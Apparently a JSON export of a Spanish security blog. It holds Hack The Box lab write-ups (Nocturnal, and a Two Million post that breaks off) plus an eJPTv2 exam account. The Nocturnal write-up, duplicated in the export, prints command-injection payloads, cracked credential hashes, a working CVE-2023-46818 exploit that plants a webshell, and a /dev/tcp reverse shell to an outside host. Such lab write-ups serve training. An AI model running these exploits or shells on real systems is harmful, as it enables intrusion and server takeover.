[ { "title": "Nocturnal - Easy (HTB)", "url": "/posts/nocturnal-easy/", "categories": "Writeups, HTB", "tags": "HTB, nocturnal, idor, rce, ispconfig, cve-2023-46818, linux, hashcat, ffuf", "date": "2025-08-23 19:00:00 -0600", "content": "Nocturnal ‚Äî EASY Este writeup detalla la explotaci√≥n de la m√°quina Nocturnal de Hack The Box, utilizando un fallo de IDOR para obtener credenciales, una RCE en el script de backup de la base de datos SQLite, y una escalada de privilegios a root mediante la explotaci√≥n del CVE-2023-46818 en ISPConfig. üìÖ Fecha: 20-04-2025 ¬† üîó IP: 10.10.11.64 ¬† üîç Estado: üéØ Resuelta Reconocimiento Comenzamos con un escaneo exhaustivo de puertos para identificar la superficie de ataque. ‚ï≠‚îÄkali@kali ~/Nocturnal/nmap at üïê 17:40 ‚ï∞‚îÄ‚ùØ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.64 ¬†-oN Scan_Inicial.txt Lo que el escaneo dio: Nmap scan report for 10.10.11.64 Host is up, received user-set (0.14s latency). Scanned at 2025-08-23 17:41:25 EDT for 14s Not shown: 62580 closed tcp ports (reset), 2953 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Read data files from: /usr/share/nmap # Nmap done at Sat Aug 23 17:41:39 2025 -- 1 IP address (1 host up) scanned in 14.47 seconds Ahora a escanear los puertos: ‚ï≠‚îÄkali@kali ~/Nocturnal/nmap at üïê 17:42 ‚ï∞‚îÄ‚ùØ nmap 10.10.11.64 -p 22,80 -sCV --min-rate 5000 -oN Scan_Ports.txt Lo obtenido: Nmap scan report for 10.10.11.64 Host is up (0.14s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA) | 256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA) |_ 256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://nocturnal.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Aug 23 17:44:11 2025 -- 1 IP address (1 host up) scanned in 11.57 seconds La informaci√≥n obtenida mostr√≥ que el servicio SSH estaba corriendo con OpenSSH 8.2p1 y que el servicio web usaba nginx 1.18.0, tambi√©n d√°ndonos el nombre del dominio: http://nocturnal.htb/. Antes de adentrarnos a la p√°gina web a√±adimos el dominio al /etc/hosts: ‚ï≠‚îÄkali@kali ~/Nocturnal/nmap at üïê 17:47 ‚ï∞‚îÄ‚ùØ echo \"10.10.11.64 nocturnal.htb\" | sudo tee -a /etc/hosts Haciendo un whatweb esto es lo que arroja: ‚ï≠‚îÄkali@kali ~/Nocturnal at üïê 17:55 ‚ï∞‚îÄ‚ùØ whatweb http://nocturnal.htb/ http://nocturnal.htb/ [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[support@nocturnal.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.64], Title[Welcome to Nocturnal], nginx[1.18.0] Vemos que maneja PHP. Al ver la p√°gina, observamos que pide iniciar sesi√≥n o registrarse para poder subir y ver archivos. Tambi√©n cuenta con una secci√≥n Contact Us con correo support@nocturnal.htb. Creamos una cuenta y nos logeamos con test:test. Como dec√≠a el inicio, podemos subir archivos. he subido un archivo test.pdf, que no contiene mucho, sin embargo una vez subido el archivo hace referencia Y acepta como par√°metro el usuario, entonces, que pasa si hacemos un fuzzing a los usuarios? hasta encontrar uno que sea el correcto ‚ï≠‚îÄkali@kali ~/Nocturnal at üïê 18:14 ‚ï∞‚îÄ‚ùØ ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&amp;file=*.pdf' \\ -w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \\ -mc 200 -fr \"User not found.\" \\ -H \"Cookie: PHPSESSID=[REDACTED]\" Pese que aparecieron muchos usuarios, el mas interesante es amanda, puesto que amanda tiene un tama√±o diferente al de todos los demas, esto ya es una buena pista y buen comienzo amanda [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 142ms] Ahora, probamos directamente: http://nocturnal.htb/view.php?username=amanda&amp;file=*.pdf Vemos que amanda tiene un archivo: viendo un poco el archivo, puesto, veo que en el archivo content.xml viene lo siguiente &lt;/text:p&gt; &lt;text:p text:style-name=\"P1\"&gt; Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure. &lt;/text:p&gt; &lt;text:p text:style-name=\"P1\"&gt; The file has been created and provided by Nocturnal's IT team. If you have any questions or need additional assistance during the password change process, please do not hesitate to contact us. &lt;/text:p&gt; &lt;text:p text:style-name=\"P1\"&gt; Remember that maintaining the security of your credentials is paramount to protecting your information and that of the company. We appreciate your prompt attention to this matter. &lt;/text:p&gt; &lt;text:p text:style-name=\"P1\"/&gt; &lt;text:p text:style-name=\"P1\"&gt;Yours sincerely,&lt;/text:p&gt; &lt;text:p text:style-name=\"P1\"&gt;Nocturnal's IT team&lt;/text:p&gt; Con esa contrase√±a temporal, iniciamos sesi√≥n: amanda tiene acceso a un panel de administraci√≥n: El panel permite crear un backup: Viendo el c√≥digo de registro de usuarios: &lt;?php session_start(); $db = new SQLite3('../nocturnal_database/nocturnal_database.db'); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $username = $_POST['username']; $password = md5($_POST['password']); $stmt = $db-&gt;prepare(\"INSERT INTO users (username, password) VALUES (:username, :password)\"); $stmt-&gt;bindValue(':username', $username, SQLITE3_TEXT); $stmt-&gt;bindValue(':password', $password, SQLITE3_TEXT); if ($stmt-&gt;execute()) { $_SESSION['success'] = 'User registered successfully!'; header('Location: login.php'); exit(); } else { $error = 'Failed to register user.'; } } ?&gt; Interceptamos con Burp la petici√≥n del backup: POST /admin.php HTTP/1.1 Host: nocturnal.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 45 Origin: http://nocturnal.htb Connection: keep-alive Referer: http://nocturnal.htb/admin.php Cookie: PHPSESSID=[REDACTED] Upgrade-Insecure-Requests: 1 Priority: u=0, i password=%0Abash%09-c%09\"whoami\"%0A&amp;backup= vemos nada mas ni nada menos que una base de datos, entonces, intentemos interceptar la peticion que hace burp suite cuando queremos descargar el backup Efectivamente si lo hay respondiendonos del usuario www-data ahora veremos la base de datos password=%0Abash%09 c%09\"sqlite3%09/var/www/nocturnal_database/nocturnal_database.db%09.dump\"%0A &amp;backup= INSERT INTO users VALUES(1,'admin','d725aeba143f575736b07e045d8ceebb'); INSERT INTO users VALUES(2,'amanda','df8b20aa0c935023f99ea58358fb63c4'); INSERT INTO users VALUES(4,'tobias','55c82b1ccd55ab219b3b109b07d5061d'); INSERT INTO users VALUES(6,'kavi','f38cde1654b39fea2bd4f72f1ae4cdda'); INSERT INTO users VALUES(7,'e0Al5','101ad4543a96a7fd84908fd0d802e7db'); INSERT INTO users VALUES(8,'ciul','49858702f9317d7b6180b31c8a8120e4'); INSERT INTO users VALUES(9,'ataman','4de85829cc9cdd6983000733b8779c6f'); INSERT INTO users VALUES(10,'Smith','7076192633a1cc795f4db1c674b217b6'); todo lo meteremos a un archivo llamado hash.txt y aplicaremos el siguiente comando ‚ï≠‚îÄkali@kali ~/Nocturnal/contenido at üïê 20:40 ‚ï∞‚îÄ‚ùØ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt El unico que nos dio fue el siguiente 55c82b1ccd55ab219b3b109b07d5061d : slowmotionapocalypse Parece ser del usuario tobias, haremos conexion por ssh, asi conseguimos la flag user.txt tobias@nocturnal:~$ ls user.txt Escalada Ahora para elevar privilegios, podemos verificar que tobias no tiene permiso sudo tobias@nocturnal:~$ sudo -l [sudo] password for tobias: Sorry, user tobias may not run sudo on nocturnal. tobias@nocturnal:~$ al investigar mas al fondo encontramos que la maquina tiene el puerto corriendo un servicio entonces podriamos hacer un port forward, para poder ver desde nuestra maquina ‚ï≠‚îÄkali@kali ~/Nocturnal at üïê 20:54 ‚ï∞‚îÄ‚ùØ ssh -L 9001:127.0.0.1:8080 tobias@10.10.11.64 una vez hecho podemos ver http://localhost:9001 en nuestro navegador y nos topamos con un login para logearme fue cuestion de usar admin:slowmotionapocalypse y conseguimos la pantalla del ispconfig Notamos que la versiones ISPConfig Version: 3.2.10p1, si googleamos esto encontramos lo siguiente, confirmando que esta version es vulnerable Explotamos la CVE-2023-46818 (language_edit.php). Script usado: #!/usr/bin/env python3 import requests, re, sys, base64, urllib.parse requests.packages.urllib3.disable_warnings() URL, USER, PW = sys.argv[1:4] # uso: python3 exploit.py http://x/ admin pass if not URL.endswith('/'): URL += '/' s = requests.Session(); s.verify = False # 1) login r = s.post(URL+'login/', data={'username':USER,'password':PW,'s_mod':'login'}) if 'Username or Password wrong' in r.text: sys.exit('[-] Login fail') print('[+] Logged in') # 2) busca tokens CSRF en language_edit lang_params = {'lang':'en','module':'help','lang_file':'xyz.lng'} r = s.get(URL+'admin/language_edit.php', params=lang_params) csrf_id = re.search(r'name=\"_csrf_id\"\\s+value=\"([^\"]+)\"', r.text)[1] csrf_key = re.search(r'name=\"_csrf_key\"\\s+value=\"([^\"]+)\"', r.text)[1] # 3) payload: escribe sh.php php = \"&lt;?php echo 'OK'; if(isset($_GET['c'])) system($_GET['c']); ?&gt;\" inj = f\"'];file_put_contents('sh.php',base64_decode('{base64.b64encode(php.encode()).decode()}'));die;#\" data = {'lang':'en','module':'help','lang_file':'xyz.lng', '_csrf_id':csrf_id,'_csrf_key':csrf_key,'records[\\\\]':inj} s.post(URL+'admin/language_edit.php', data=data) print('[+] Webshell planted as /admin/sh.php') # 4) prueba r = s.get(URL+'admin/sh.php', params={'c':'id'}) print('[+] Command output:\\n', r.text) y este deber√≠a ser la forma en la que ejecutamos el exploit ‚ï≠‚îÄkali@kali ~/Nocturnal/exploits via üêç v3.13.6 at üïê 21:15 ‚ï∞‚îÄ‚ùØ python3 exploit.py http://localhost:9001/ admin 'slowmotionapocalypse' [+] Logged in [+] Webshell planted as /admin/sh.php [+] Command output: OKuid=0(root) gid=0(root) groups=0(root) title: ‚ÄúNocturnal - Easy (HTB)‚Äù date: 2025-08-23 18:00:00 -0700 categories: [Writeups, HTB] tags: [HTB, nocturnal, idor, rce, ispconfig, cve-2023-46818, linux, hashcat, ffuf] toc: true comments: true description: ‚ÄúWriteup t√©cnico de Nocturnal en HackTheBox: desde fuzzing y SQLite hasta explotaci√≥n de ISPConfig con CVE-2023-46818.‚Äù Nocturnal ‚Äî EASY Este writeup detalla la explotaci√≥n de la m√°quina Nocturnal de Hack The Box, utilizando un fallo de IDOR para obtener credenciales, una RCE en el script de backup de la base de datos SQLite, y una escalada de privilegios a root mediante la explotaci√≥n del CVE-2023-46818 en ISPConfig. üìÖ Fecha: 20-04-2025 üîó IP: 10.10.11.64 üîç Estado: üéØ Resuelta Reconocimiento Comenzamos con un escaneo exhaustivo de puertos para identificar la superficie de ataque. ‚ï≠‚îÄkali@kali ~/Nocturnal/nmap at üïê 17:40 ‚ï∞‚îÄ‚ùØ sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.64 -oN Scan_Inicial.txt Lo que el escaneo dio: Nmap scan report for 10.10.11.64 Host is up, received user-set (0.14s latency). Scanned at 2025-08-23 17:41:25 EDT for 14s Not shown: 62580 closed tcp ports (reset), 2953 filtered tcp ports (no-response) Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Read data files from: /usr/share/nmap # Nmap done at Sat Aug 23 17:41:39 2025 -- 1 IP address (1 host up) scanned in 14.47 seconds A continuaci√≥n escaneamos los puertos con detecci√≥n de servicios: ‚ï≠‚îÄkali@kali ~/Nocturnal/nmap at üïê 17:42 ‚ï∞‚îÄ‚ùØ nmap 10.10.11.64 -p 22,80 -sCV --min-rate 5000 -oN Scan_Ports.txt Lo obtenido: Nmap scan report for 10.10.11.64 Host is up (0.14s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to [http://nocturnal.htb/](http://nocturnal.htb/) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) . # Nmap done at Sat Aug 23 17:44:11 2025 -- 1 IP address (1 host up) scanned in 11.57 seconds La informaci√≥n obtenida mostr√≥ que el servicio SSH estaba corriendo con OpenSSH 8.2p1 y que el servicio web usaba nginx 1.18.0, adem√°s se present√≥ el nombre del dominio: http://nocturnal.htb/. Antes de navegar a√±adimos el dominio al /etc/hosts: ‚ï≠‚îÄkali@kali ~/Nocturnal/nmap at üïê 17:47 ‚ï∞‚îÄ‚ùØ echo \"10.10.11.64 nocturnal.htb\" | sudo tee -a /etc/hosts Haciendo un whatweb esto es lo que arroja: ‚ï≠‚îÄkali@kali ~/Nocturnal at üïê 17:55 ‚ï∞‚îÄ‚ùØ whatweb http://nocturnal.htb/ http://nocturnal.htb/ [200 OK] Cookies[PHPSESSID], Country[RESERVED][ZZ], Email[support@nocturnal.htb], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.64], Title[Welcome to Nocturnal], nginx[1.18.0] Vemos que maneja PHP. Al visitar la web observamos que pide iniciar sesi√≥n o registrarse para poder subir y ver archivos. Tambi√©n cuenta con una secci√≥n Contact Us con correo support@nocturnal.htb. Creamos una cuenta y nos logeamos con test:test. Como coment√©, el sitio permite subir archivos. Sub√≠ un archivo test.pdf y not√© que la funcionalidad de visualizaci√≥n acepta un par√°metro username, lo que sugiere un fallo de Insecure Direct Object Reference (IDOR) en view.php. Para explotarlo, realic√© un fuzzing a los usuarios buscando un tama√±o de respuesta distinto que indicara un archivo real: ‚ï≠‚îÄkali@kali ~/Nocturnal at üïê 18:14 ‚ï∞‚îÄ‚ùØ ffuf -u 'http://nocturnal.htb/view.php?username=FUZZ&amp;file=*.pdf' \\ --w /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt \\ --mc 200 -fr \"User not found.\" \\ --H \"Cookie: PHPSESSID=[REDACTED]\" El usuario m√°s interesante fue amanda, ya que devolv√≠a un tama√±o distinto al resto: amanda [Status: 200, Size: 3113, Words: 1175, Lines: 129, Duration: 142ms] Accedimos a: http://nocturnal.htb/view.php?username=amanda&amp;file=*.pdf Dentro del archivo (en content.xml) apareci√≥ una contrase√±a temporal: &lt;text:p text:style-name=\"P1\"&gt; Nocturnal has set the following temporary password for you: arHkG7HAI68X8s1J. This password has been set for all our services, so it is essential that you change it on your first login to ensure the security of your account and our infrastructure. &lt;/text:p&gt; Con esa contrase√±a temporal (arHkG7HAI68X8s1J) iniciamos sesi√≥n como amanda. amanda tiene acceso a un panel de administraci√≥n con una funci√≥n para crear un backup. Al revisar el c√≥digo de registro de usuarios comprobamos que se usa una base de datos SQLite: &lt;?php session_start(); $db = new SQLite3('../nocturnal_database/nocturnal_database.db'); // ... c√≥digo de registro ... ?&gt; Explotaci√≥n de RCE en la Funci√≥n de Backup Interceptamos con Burp la petici√≥n POST del backup y descubrimos que el par√°metro password se inyectaba en la shell, permitiendo Ejecuci√≥n Remota de Comandos (RCE). Se usaron caracteres URL-encoded (%0A para nueva l√≠nea, %09 para tabulaci√≥n) para inyectar comandos de shell. POST /admin.php HTTP/1.1 Host: nocturnal.htb ... password=%0Abash%09-c%09\"whoami\"%0A&amp;backup= Con la RCE se pudo dumpear la base de datos SQLite usando sqlite3: password=%0Abash%09 c%09\"sqlite3%09/var/www/nocturnal_database/nocturnal_database.db%09.dump\"%0A &amp;backup= Fragmento del volcado: INSERT INTO users VALUES(1,'admin','d725aeba143f575736b07e045d8ceebb'); INSERT INTO users VALUES(2,'amanda','df8b20aa0c935023f99ea58358fb63c4'); INSERT INTO users VALUES(4,'tobias','55c82b1ccd55ab219b3b109b07d5061d'); INSERT INTO users VALUES(6,'kavi','f38cde1654b39fea2bd4f72f1ae4cdda'); INSERT INTO users VALUES(7,'e0Al5','101ad4543a96a7fd84908fd0d802e7db'); INSERT INTO users VALUES(8,'ciul','49858702f9317d7b6180b31c8a8120e4'); INSERT INTO users VALUES(9,'ataman','4de85829cc9cdd6983000733b8779c6f'); INSERT INTO users VALUES(10,'Smith','7076192633a1cc795f4db1c674b217b6'); Guardamos los hashes en hash.txt y ejecutamos hashcat (MD5, -m 0): ‚ï≠‚îÄkali@kali ~/Nocturnal/contenido at üïê 20:40 ‚ï∞‚îÄ‚ùØ hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt El √∫nico hash que se cracke√≥ fue: 55c82b1ccd55ab219b3b109b07d5061d : slowmotionapocalypse Corresponde al usuario tobias con la contrase√±a slowmotionapocalypse. Conectamos por SSH y conseguimos la flag user.txt. Escalada Verificamos que tobias no tiene permiso sudo: tobias@nocturnal:~$ sudo -l [sudo] password for tobias: Sorry, user tobias may not run sudo on nocturnal. tobias@nocturnal:~$ Localizamos un servicio escuchando en 127.0.0.1:8080 y realizamos un port forward via SSH: ‚ï≠‚îÄkali@kali ~/Nocturnal at üïê 20:54 ‚ï∞‚îÄ‚ùØ ssh -L 9001:127.0.0.1:8080 tobias@10.10.11.64 Accedimos a http://localhost:9001 y nos encontramos con la pantalla de login de ISPConfig. Usando admin:slowmotionapocalypse (reutilizaci√≥n de contrase√±a) iniciamos sesi√≥n y vimos que la versi√≥n instalada es ISPConfig Version: 3.2.10p1, vulnerable a CVE-2023-46818. Explotaci√≥n CVE-2023-46818 (RCE Root) La vulnerabilidad permite inyectar PHP en language_edit.php a trav√©s del par√°metro records[]. Si se logra una cuenta de superadministrador, es posible escribir c√≥digo PHP que se ejecuta con privilegios del proceso web. Script usado (exploit que planta una webshell): #!/usr/bin/env python3 import requests, re, sys, base64, urllib.parse requests.packages.urllib3.disable_warnings() URL, USER, PW = sys.argv[1:4] # uso: python3 exploit.py http://x/ admin pass if not URL.endswith('/'): URL += '/' s = requests.Session(); s.verify = False # 1) login r = s.post(URL+'login/', data={'username':USER,'password':PW,'s_mod':'login'}) if 'Username or Password wrong' in r.text: sys.exit('[-] Login fail') print('[+] Logged in') # 2) busca tokens CSRF en language_edit lang_params = {'lang':'en','module':'help','lang_file':'xyz.lng'} r = s.get(URL+'admin/language_edit.php', params=lang_params) csrf_id = re.search(r'name=\"_csrf_id\"\\s+value=\"([^\"]+)\"', r.text)[1] csrf_key = re.search(r'name=\"_csrf_key\"\\s+value=\"([^\"]+)\"', r.text)[1] # 3) payload: escribe sh.php php = \"&lt;?php echo 'OK'; if(isset($_GET['c'])) system($_GET['c']); ?&gt;\" inj = f\"'];file_put_contents('sh.php',base64_decode('{base64.b64encode(php.encode()).decode()}'));die;#\" data = {'lang':'en','module':'help','lang_file':'xyz.lng', '_csrf_id':csrf_id,'_csrf_key':csrf_key,'records[\\\\]':inj} s.post(URL+'admin/language_edit.php', data=data) print('[+] Webshell planted as /admin/sh.php') # 4) prueba r = s.get(URL+'admin/sh.php', params={'c':'id'}) print('[+] Command output:\\n', r.text) Y su uso: ‚ï≠‚îÄkali@kali ~/Nocturnal/exploits via üêç v3.13.6 at üïê 21:15 ‚ï∞‚îÄ‚ùØ python3 exploit.py http://localhost:9001/ admin 'slowmotionapocalypse' [+] Logged in [+] Webshell planted as /admin/sh.php [+] Command output: OKuid=0(root) gid=0(root) groups=0(root) [!NOTE] ¬øQu√© es y por qu√© ocurre? CVE-2023-46818 afecta a ISPConfig ‚â§ 3.2.11 cuando est√° activada la opci√≥n admin_allow_langedit. El editor de idiomas (/admin/language_edit.php) procesa el par√°metro records[] sin sanitizaci√≥n suficiente, permitiendo inyecci√≥n de PHP y ejecuci√≥n de c√≥digo con los privilegios del proceso de la interfaz web (en algunas instalaciones, ese contexto puede llegar a ser root). El fallo qued√≥ parchado en 3.2.11p1. NVDISPConfig Importante: el propio proyecto indica que la explotaci√≥n requiere estar autenticado como el usuario ‚Äúadmin‚Äù (superadmin incorporado); cuentas de cliente/reseller/email y ‚Äúotros admins‚Äù creados adicionalmente no estar√≠an afectadas por este vector. Ahora podremos verificar si tenemos una webshell, dentro de la ruta /admin/sh.php y usando el parametro id confirmamos que la webshell se hizo y tenemos root, quiz√°s pudi√©ramos verificar la rota root y sacar le flag, pero que sentido tiene si no lo hacemos en la terminal no? vamos a eso ahora hagamos lo mismo pero para una Reverse shell Reverse shell: http://localhost:9001/admin/sh.php?c=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.177/4444%200%3E%261%27 Finalmente, como root buscamos la flag: root@nocturnal:/usr/local/ispconfig/interface/web# cd /root root@nocturnal:~# ls root.txt scripts Flag conseguida. ‚úÖ ahora podremos verificar si tenemos una webshell, dentro de la ruta /admin/sh.php y usando el parametro id confirmamos que la webshell se hizo y tenemos root, quiz√°s pudi√©ramos verificar la rota root y sacar le flag, pero que sentido tiene si no lo hacemos en la terminal no? vamos a eso ahora hagamos lo mismo pero para una Reverse shell Reverse shell: http://localhost:9001/admin/sh.php?c=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/10.10.14.177/4444%200%3E%261%27 Y ya como root: root@nocturnal:/usr/local/ispconfig/interface/web# cd /root cd /root root@nocturnal:~# ls ls root.txt scripts Flag conseguida. ‚úÖ" }, { "title": "Mi experiencia con la certificaci√≥n eJPTv2", "url": "/posts/certificado-ejpt/", "categories": "certificaciones, Experiencias", "tags": "ejptv2, ine, ciberseguridad, certificaciones", "date": "2025-08-04 00:00:00 -0600", "content": "Mi experiencia con la certificaci√≥n eJPTv2 Desde hace tiempo ten√≠a ganas de certificarme en algo pr√°ctico relacionado con hacking. Ya ven√≠a con algo de experiencia en labs como Hack The Box y TryHackMe, y la teor√≠a no era completamente nueva para m√≠. Por eso, cuando conoc√≠ la eJPTv2, supe que era el paso l√≥gico. Me interes√≥ por dos cosas: El examen es 100% pr√°ctico. La certificaci√≥n tiene buen reconocimiento si est√°s comenzando. As√≠ que compr√© el curso y comenc√© a prepararme. C√≥mo lo viv√≠ El material del curso oficial est√° completo, pero hay que tener paciencia. No es algo que puedas hacer a la carrera si realmente quieres entenderlo todo. Me organic√© a mi ritmo. Algunos m√≥dulos los pas√© r√°pido, otros me tomaron m√°s tiempo. Iba combinando con laboratorios de otras plataformas para no aburrirme. En general me sent√≠ c√≥modo. Muchos temas ya los hab√≠a visto antes: escaneo con Nmap, vulnerabilidades web b√°sicas, servicios comunes, etc. No me sent√≠ perdido, pero tampoco confiado. Lo que m√°s me cost√≥ Hubo dos cosas que me hicieron sudar: El pivoting: es una t√©cnica que no hab√≠a practicado mucho antes. En el examen la tienes que aplicar s√≠ o s√≠, y si no entiendes el concepto, te puedes quedar atascado f√°cil. Algunas preguntas del examen: no por la dificultad t√©cnica, sino por c√≥mo estaban redactadas. A veces me generaban dudas sobre lo que realmente me estaban pidiendo, as√≠ que tuve que leerlas m√°s de una vez y pensar con calma. Pero en ning√∫n momento sent√≠ que fuera imposible. Solo hab√≠a que respirar, volver a lo b√°sico y seguir. El examen Te dan 48 horas para hacerlo, pero no necesitas todo ese tiempo. Yo lo resolv√≠ en 20 horas, con descansos entre secciones y repasando mucho las preguntas. No puedo compartir detalles espec√≠ficos (por NDA), pero s√≠ puedo decir esto: si estudiaste bien, no hay sorpresa. Todo lo que se eval√∫a fue cubierto en el curso. Us√© las herramientas de siempre: Nmap, netcat, Burp Suite, y algunos scripts simples. Nada loco. Lo m√°s importante fue la l√≥gica, no las herramientas. ¬øVali√≥ la pena? S√≠. Es una certificaci√≥n muy recomendable si ya llevas un poco de camino recorrido y quieres algo pr√°ctico que te rete. No me hizo experto, pero s√≠ me dio una buena base para seguir aprendiendo y me confirm√≥ que estoy en el camino correcto. Adem√°s, ahora tengo algo que respalda el tiempo que llevo practicando y estudiando por mi cuenta. ¬øQu√© sigue? Quiero seguir puliendo skills m√°s avanzadas: pivoting, post-explotaci√≥n y escalada de privilegios. Tambi√©n quiero entrarle bien a temas como OSINT y an√°lisis de tr√°fico. El EWPT y CPTS est√°n en mi radar, pero todav√≠a no es momento. Por ahora quiero seguir entrenando, hacer m√°s labs, y escribir m√°s writeups. ¬øTienes dudas sobre la eJPTv2 o est√°s pensando en presentarla? Puedes escribirme, no tengo todas las respuestas, pero s√≠ te puedo decir c√≥mo me fue y qu√© hubiera hecho diferente." }, { "title": "Two Million - Easy (HTB)", "url": "/posts/two-million-writeup/", "categories": "Writeups, HackTheBox", "tags": "HTB, API, Privilege Escalation, CVE-2023-0386, ROT13, BurpSuite", "date": "2025-07-19 00:00:00 -0600", "content": "Two Million - Easy Fecha: 04-05-2025 Estado: Resuelta Reconocimiento Arrancamos con el cl√°sico escaneo de puertos para conocer qu√© servicios est√°n disponibles y abiertos en la m√°quina objetivo. Usamos nmap con opciones agresivas para que el escaneo sea r√°pido pero efectivo: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.221 Resultado: PORT STATE SERVICE REASON 22/tcp open ssh syn-ack ttl 63 80/tcp open http syn-ack ttl 63 Solo dos puertos abiertos, nada raro: SSH para acceso remoto y HTTP para la web. Esto ya reduce el campo de juego, porque sabemos que aqu√≠ hay que escarbar en la web y luego intentar algo con SSH. Luego, hacemos un escaneo m√°s detallado con detecci√≥n de versiones para saber qu√© software exacto corre detr√°s: nmap -p22,80 -sCV 10.10.11.221 El resultado nos muestra: 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0) 80/tcp open http nginx |_http-title: Did not follow redirect to http://2million.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Detectamos que el servidor web usa nginx y redirige a un dominio interno 2million.htb. Esto nos indica que la m√°quina est√° configurada con virtual hosts y hay que ajustar nuestro archivo hosts local para poder acceder a esa web correctamente. Desofuscando el JS Al meternos en la p√°gina, notamos que algunas funciones no est√°n visibles a simple vista, pero al inspeccionar el c√≥digo fuente encontramos un archivo JavaScript ofuscado con un eval que nos llama la atenci√≥n. Usamos herramientas para desofuscar el JS y descubrimos que contiene funciones interesantes: verifyInviteCode(code): env√≠a un POST a /api/v1/invite/verify para verificar c√≥digos de invitaci√≥n. makeInviteCode(): env√≠a un POST a /api/v1/invite/how/to/generate para generar c√≥digos de invitaci√≥n. Esto nos revela que la aplicaci√≥n tiene rutas API internas que podemos probar manualmente, lo cual ya nos pone en la pista de una API mal protegida que podemos explotar. Generando c√≥digo de invitaci√≥n Probamos la ruta que genera el c√≥digo con un simple curl: curl -X POST http://2million.htb/api/v1/invite/how/to/generate -H \"Content-Type: application/json\" Respuesta: { \"0\":200, \"success\":1, \"data\":{ \"data\":\"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr\", \"enctype\":\"ROT13\" }, \"hint\":\"Data is encrypted ... check encryption type...\" } Aqu√≠ la respuesta est√° cifrada con ROT13, algo sencillo pero que denota que el equipo quiso poner una ‚Äúcapa extra‚Äù para ocultar rutas. Desciframos y obtenemos: In order to generate the invite code, make a POST request to /api/v1/invite/generate La t√≠pica pista que no esper√°bamos, pero bienvenida. As√≠ que seguimos con la siguiente petici√≥n: curl -X POST http://2million.htb/api/v1/invite/generate -H \"Content-Type: application/json\" Y recibimos: {\"0\":200,\"success\":1,\"data\":{\"code\":\"OFZDRTktV0xMV1UtM1pLOFMtUEg0Wlg=\"}} Un c√≥digo base64 que nos permite registrar un usuario. Esto ya nos pone dentro del sistema con un usuario v√°lido, sin tener que adivinar credenciales. Enumerando m√°s APIs Con Burp Suite empezamos a mapear m√°s rutas y nos topamos con rutas bajo /api/v1/admin. Nos fijamos en /api/v1/admin/settings/update y, para sorpresa, acepta m√©todos GET, POST y PUT, lo que indica una mala configuraci√≥n. Intentamos una inyecci√≥n b√°sica para ver si podemos escalar privilegios: curl -X PUT http://2million.htb/api/v1/admin/settings/update \\ -H \"Content-Type: application/json\" \\ -H \"Cookie: PHPSESSID=XXXX\" \\ -d '{ \"email\": \"test@test.com\", \"is_admin\": 1, \"setting\": \"test; cat /etc/passwd\" }' Respuesta: {\"id\":13,\"username\":\"test\",\"is_admin\":1} Boom. Cambiamos el flag is_admin a 1 directamente, con lo que nuestro usuario ya tiene privilegios administrativos, sin validaci√≥n ni seguridad. Esto es una falla grave que ya abre muchas puertas. RCE y Reverse Shell Con privilegios admin, probamos si podemos ejecutar comandos arbitrarios usando la API de generaci√≥n de VPN, que aceptaba par√°metros sin filtrar: curl -X POST http://2million.htb/api/v1/admin/vpn/generate \\ --cookie \"PHPSESSID=XXXX\" \\ --header \"Content-Type: application/json\" \\ --data '{\"username\":\"test;id;\"}' Respuesta: uid=33(www-data) gid=33(www-data) groups=33(www-data) ¬°Listo! Confirmamos ejecuci√≥n remota de comandos (RCE). Ahora el siguiente paso 